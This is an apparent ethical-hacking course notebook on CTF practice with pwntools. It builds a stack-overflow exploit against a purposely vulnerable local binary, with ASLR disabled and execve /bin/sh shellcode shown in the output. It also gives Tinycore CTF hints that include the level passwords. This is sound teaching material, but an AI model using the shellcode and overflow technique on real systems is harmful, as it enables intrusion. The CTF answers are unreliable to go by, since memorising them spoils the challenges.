# Capture The Flag (CTF)

- How the Best Hackers Learn Their Craft: [Watch YouTube](https://www.youtube.com/watch?v=6vj96QetfTg&t=214s&ab_channel=RSAConference)
- CTF Handbook - https://ctf101.org/

## online CTF
- Learn CTF - https://ctflearn.com/
- PicoCTF - https://picoctf.org/

## pwntools and CTF
- pwntools is designed for quick exploitation in CTF environments
- most CTF environments use client-server architecture
    - flag is on the server
    - you interact to the server from a remote client
    - exploit the server program and capture the flag (CTF)
    
- you can easily create a server using netcat (nc) program in listening mode
- you can also execute a binary/program when client connects to it
- let's look into the `demos/ctf/basic` folder that tries to simulate the CTF-like environment
- we'll use the `demos/ctf/basic/vuln.cpp` program to demonstrate how **pwntools** framework can be used to create a CTF-like challenge
- a good YouTube video on Pwn Template and Input / Output is found here: https://www.youtube.com/watch?v=NhNbivMVPk0&ab_channel=ChristopherSchafer](https://www.youtube.com/watch?v=NhNbivMVPk0&ab_channel=ChristopherSchafer)

## Netcat (nc)
- https://en.wikipedia.org/wiki/Netcat
- https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
- `nc` - networking utility for reading from and writing to network connections using TCP or UDP
- can be very useful to transfer file between computers with limited resources


```python
!pwd
```


```python
%cd ../demos/ctf/basic
```


```python
! ls -al
```

    total 40
    drwxrwxrwx+ 2 codespace codespace 4096 Mar 12 18:58 .
    drwxrwxrwx+ 6 codespace codespace 4096 Mar 12 18:58 ..
    -rw-rw-rw-  1 codespace codespace 1054 Mar 12 18:58 Makefile
    -rwxrwxrwx  1 codespace codespace 1898 Mar 12 18:58 exploit.py
    -rw-rw-rw-  1 codespace codespace 2318 Mar 12 18:58 exploit_demo.py
    -rw-rw-rw-  1 codespace codespace 1334 Mar 12 18:58 exploit_getoffset.py
    -rw-rw-rw-  1 codespace codespace 2576 Mar 12 18:58 exploit_vuln.py
    -rw-rw-rw-  1 codespace codespace   27 Mar 12 18:58 flag.txt
    -rw-rw-rw-  1 codespace codespace  116 Mar 12 18:58 netcat-loop.sh
    -rw-rw-rw-  1 codespace codespace 1109 Mar 12 18:58 vuln.cpp



```python
! cat vuln.cpp
```

### compile and run as a server

- `make` command must be run as sudo, as the Makefile also disables randomize_va_space
- inorder to use `Makefile` and the Python exploit code easily, we'll change the working directory to ctf-demos/basic

```bash
┌──(kali㉿K)-[~/SoftwareSecurity]
└─$ cd ctf/basic 
- must run make with sudo to disable randomaize_va_space

┌──(kali㉿K)-[~/SoftwareSecurity/ctf/basic]
└─$ sudo make       
[sudo] password for kali: 
# must run make with sudo to disable randomaize_va_space
echo 0 | tee /proc/sys/kernel/randomize_va_space
0
g++ -g -Wall -m32 -fno-stack-protector -z execstack -no-pie vuln.cpp  -o vuln.exe 

```

- let's make sure the target binary vuln.exe doesn't have any security controls in place to prevent overflow exploitation
- we can use pwntools **checksec** command

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ pwn checksec vuln.exe                            
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.3.1)
[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

- you can follow the instruction shown to never check for the pwntools update

- make sure the nc server is listening on localhost port 1234 to run vuln.exe on client's connection

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ nc -v -l 127.0.0.1 -p 1234 -e vuln.exe
listening on [any] 1234 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 38332

```

- open another terminal and run netcat to connect to the server 

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ nc localhost 1234                                
buffer is at 0xffffc360
Give me some text: sdf
Acknowledged: sdf with length 3
Good bye!
```

- NOTE that when the netcat server finished executing the vuln.exe program upon client's connection, the server then stops
- you'll have to manually run the netcat server again inorder to interact from a client again...
- this can be annoying as we'll have to interact with the vulnerable program many times
- the following bash script comes to our rescue!


```python
! cat netcat-loop.sh
```

- from one terminal, run the bash script, so server is listening indefinitely one clinet after another

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ bash netcat-loop.sh 
listening on [any] 1234 ...

connect to [127.0.0.1] from localhost [127.0.0.1] 38336
listening on [any] 1234 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 38340
listening on [any] 1234 ...
```

- from another terminal, continously connect to the server without having to rerun the server!

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ nc localhost 1234                                
buffer is at 0xffffc360
Give me some text: sdf
Acknowledged: sdf with length 3
Good bye!
```

## Remote CTF Demo
- use `pwntools` to create a exploit code template
- to create exploit template, we need the following:
    - name of the target program
    - ip of the host the binary will be running on (use 127.0.0.1 loopback for localhost as in this demo)
    - the port number the server is listening on (pick unuser higher port numbers (above 1024)
    - for online CTF, provide the server's IP and port typically provided to the contestents

```bash
(base) kali@kali:~/EthicalHacking/demos/ctf$ pwn template ./vuln.exe --host localhost --port 1234 > exploit.py
```

- the generated `exploit.py` file provides a lot of boiler-plate code:
    - for automatically detecting architecture of the target program
    - stdio framework to interact with the target program locally
        - locally meaning accessing program.exe directly from a terminal
        - remotely meaning accessing a host via tcp/ip (ip:port)
        - the same code works without little or no modification locally and remotely
    - debug feature to display hexdump of stdio
    - feature to generate the shellcode, etc.

- let's look at the content of the `exploit.py`

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln.exe --host 127.0.0.1 --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln.exe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

```

- now let's do a quick test of the exploit code
- make sure the nc server is listening on localhost port 1234 to run vuln.exe on connection
- use the `netcat-loop.sh` script to run server in the loop

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ bash netcat-loop.sh 
listening on [any] 1234 ...
```

- open another terminal and run the exploit code exploit.py 

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ python exploit.py
[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to localhost on port 1234: Done
[*] Switching to interactive mode
buffer is at 0xffffc360
Give me some text: $ do you copy this?
Acknowledged: do you copy this? with length 17
Good bye!
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to localhost port 1234
[*] Got EOF while sending in interactive
```

### Update Exploit code
- the vulnerable program is exactly the same as the stack_overflow/so_stdio.cpp
- the exploit code is also exactly the same as a result to send and execute shellcode from the vulnerable program's stack
- let's look at the updated exploit code `exploit_vuln.py` file

### Find offset of buffer
- run the `exploit_getoffset.py` script to automatically run the binary locally, crash and find the offset from coredump
- you can also use `gdb-peda`
- offset is same locally or remotely as long as the the program is run on the same architecture

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ python exploit_getoffset.py                                                          1 ⨯ 1 ⚙
[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe': pid 11262
[*] Process '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe' stopped with exit code -11 (SIGSEGV) (pid 11262)
[+] Parsing corefile...: Done
[*] '/home/kali/EthicalHacking/ctf-demos/basic/core.11262'
    Arch:      i386-32-little
    EIP:       0x61616161
    ESP:       0xffffc3a0
    Exe:       '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe' (0x8049000)
    Fault:     0x61616161
offset = 144
```
- use the offset to generate and send the payload


```python
! cat exploit_vuln.py
```

- run the updated exploit code

```bash
┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]
└─$ python exploit_vuln.py                                                               1 ⨯ 1 ⚙
[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to 127.0.0.1 on port 1234: Done
b'Give me some text: Acknowledged: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0Ph//shh/bin\x89\xe31\xc9\x89\xcaj\x0bX\xcd\x80`\xc3\xff\xff`\xc3\xff\xff`\xc3\xff\xff`\xc3\xff\xff`\xc3\xff\xff with length 144\n'
[*] Switching to interactive mode
$ 
$ whoami
kali
$ date
Tue Dec 29 15:40:46 MST 2020
$  
```

### run Python exploit with arguments

```bash
$ python exploit_vuln.py LOCAL
$ python exploit_vuln.py HOST=127.0.0.1 PORT=1234
```

## Invoking libc functions in Python
- need https://docs.python.org/3/library/ctypes.html

## Find local libc.so file
- one way to do that is using `ldd` command along with a C/C++ binary


```python
! ldd demo.exe
# see libc.so.6 file
```


```python
from ctypes import *
```


```python
# invoke a C function in Python
libc = cdll.LoadLibrary("libc.so.6")
```


```python
libc.printf(b"Hello!\n")
# actual output is not seen on Jupyter notebook... only shows the no. of bytes printed
```


```python
# run script file instead
! cat ../rop1/libc.py
```


```python
# run script instead
! python ../rop1/libc.py
```

## Tinycore Capture The Flag (CTF)
- Download and install as a VM: - https://ctf-o-matic.github.io/capture-the-flag/
- Based on Strip CTF: https://stripe.com/blog/capture-the-flag
- Level 5 readme correction:
    - Webservice is running at port 8005 not at 9020 as the motd.txt description says
    - `$curl localhost:8005 -d "hello there"`
- Hints: https://github.com/dividuum/stripe-ctf
- Learn about Tinycore Linux: [http://tinycorelinux.net/intro.html](http://tinycorelinux.net/intro.html)
- Has 6 levels

### level00@box has two files: motd.txt and tools.txt
- cat tools.txt to get some general ideas about the tools and technqiues
- motd.txt describes about TinyCore CTF and the information on what to do to get to the next level

### Installing apps and tools - Use Tiny Core Extension: Application Browser
- Let's say you want to install gcc; first switch to `tc` user
```bash
$ su tc
$ tce 
```
- search for: compile
- install compiletc package which installs everything to compile using gcc

### Now compile level01.c program
- how to edit? Use vi or nano
- or locally edit and upload using Netcat
- TinyCoreCTF doens't have GUI to work with files so one can send files back-and-forth to a GUI supported Linux environment
    - if you want to send file to TinyCore do the following:
    - on Tinycore run netcat in listening mode:
        - `$ nc -v -l -p [port] > filename` 
    - from Kali Linux send a file:
        - `$ cat file | nc -v [tinycoreIP] [tinycorePort]`

## Hints
- see all the levels
```bash
$ cd /levels
```

### level00
- nothing to do here; but just be familiar with the CTF
- password (izeecahd) is in /home/level00/.password
```bash
$ cd /levels/level00
$ cat /home/level00/.password
```
- this folder is empty

### level01
- create a program that can read the password/flag for level01 user
- use levels/level01 files to make it happen
- password (aepeefoo) is in /home/level01/.password
- see the contents of level01
```bash
$ cd /levels/level01/
```

### level02
- web-based vulnerability
- password (quemaosh) is in /home/level02/.password file
- force the webserver to read the password file and display the content as response
- see the contents of /levels/level02/ folder
```bash
$ curl http://localhost:8002
$ less /levels/level02/level02.py
$ curl --cookie "some_cookie=value" http://localhost:8002
```
- can use browser from host to interact with the form
- http://[ip]:8002/
- use cookie editor plugin for chrome or proxy tool such as owasp zap or burpuite that come with Kali

### level03
- password (eingaima) for level03 is in /home/level03/.password file
- files in /levels/level03 may be useful
- binary level03 provides some functionalites to work with some string

```bash
$ cd /levels/level03
$ ls
$ ./level03
$ ./level03 0 "hello world"

```
- negative index?
- carefully read level03.c file
- fns is array of function addresses, find the offset of depricated run function
- pass it with proper offset to get the run function to execute
- use gdb or write a script to bruteforce it!


```python

```
